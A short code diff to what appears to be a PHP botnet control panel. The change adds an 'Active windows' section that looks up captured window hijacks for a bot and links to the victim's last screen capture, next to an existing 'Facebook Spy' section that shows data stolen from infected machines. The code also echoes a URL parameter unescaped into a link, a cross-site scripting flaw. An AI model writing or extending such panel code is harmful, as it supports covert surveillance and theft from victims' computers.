@@ -30,6 +30,18 @@ $z_name = $bot->bot_id;
         </form>
     </div>
     <div class="ui segment">
+        <h3>Active windows</h3>
+        <?php
+        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
+        $select->bindParam(':bot_id', $_GET['id']);
+        $select->execute();
+        if($select->rowCount() > 0){
+            $ids = $_GET['id'];
+            echo "<a class='ui button' href='index.php?action=hijack&id=".$ids."'>Look last window screen</a>";
+        }
+        ?>
+    </div>
+    <div class="ui segment">
         <h3>Facebook Spy</h3>
         <small><?php echo Bot::getLastSpy($_GET['id']); ?></small>
         <br />
